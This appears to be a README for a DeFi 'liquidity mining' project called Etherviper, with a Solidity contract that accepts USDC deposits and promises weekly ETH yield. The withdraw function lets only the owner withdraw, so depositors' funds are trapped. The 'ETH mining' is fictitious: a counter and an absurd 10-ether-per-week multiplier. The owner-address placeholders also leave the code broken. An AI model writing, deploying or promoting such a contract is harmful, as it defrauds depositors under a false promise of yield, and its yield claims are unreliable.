# Etherviper
DeFi liquidity mining project

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract LiquidityMining {
    using SafeMath for uint256;

    address private usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private owner = (owner address here);

    mapping(address => uint256) private balances;
    mapping(address => uint256) private lastClaimedTime;
    uint256 private totalMinedETH;

    uint256 private constant WEEK_DURATION = 1 weeks;
    uint256 private constant ETH_YIELD_PER_WEEK = 10 ether;

    constructor() {
        usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
        owner = (owner address here);
    }

    function deposit(uint256 amount) external {
        require(amount > 0, "Invalid deposit amount");

        IERC20(usdc).transferFrom(msg.sender, address(this), amount);

        balances[msg.sender] = balances[msg.sender].add(amount);
        lastClaimedTime[msg.sender] = block.timestamp;

        _mineETH();
    }

    function withdraw() external {
        require(msg.sender == owner, "Only the owner can withdraw");

        uint256 balance = balances[msg.sender];
        require(balance > 0, "No balance to withdraw");

        uint256 yield = calculateYield(msg.sender);
        uint256 totalAmount = balance.add(yield);

        IERC20(usdc).transfer(msg.sender, totalAmount);

        balances[msg.sender] = 0;
        lastClaimedTime[msg.sender] = 0;

        emit Withdrawal(msg.sender, totalAmount);
    }

    function calculateYield(address account) public view returns (uint256) {
        uint256 balance = balances[account];
        uint256 lastClaimTime = lastClaimedTime[account];
        uint256 currentTime = block.timestamp;

        uint256 yieldDuration = currentTime.sub(lastClaimTime);
        uint256 yieldPeriods = yieldDuration.div(WEEK_DURATION);

        uint256 yield = balance.mul(yieldPeriods).mul(ETH_YIELD_PER_WEEK);
        return yield;
    }

    function _mineETH() private {
        totalMinedETH = totalMinedETH.add(ETH_YIELD_PER_WEEK);
        emit MinedETH(ETH_YIELD_PER_WEEK);
    }

    event Withdrawal(address indexed account, uint256 amount);
    event MinedETH(uint256 amount);
}
